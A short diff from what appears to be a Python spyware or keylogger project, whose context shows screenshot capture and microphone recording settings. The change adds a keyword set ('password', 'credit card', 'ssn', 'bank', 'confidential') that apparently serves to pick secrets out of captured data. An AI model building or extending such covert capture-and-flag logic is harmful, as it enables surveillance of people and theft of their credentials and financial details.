@@ -15,6 +15,10 @@ screenshot_information = "data\\screenshot.jpeg"
 time_iteration = 15
 number_of_iterations_end = 2
 
+
+
+sensitive_words = {"password", "credit card", "ssn", "bank", "confidential"}
+
 def microphone():
     fs = 44100
     seconds = microphone_time
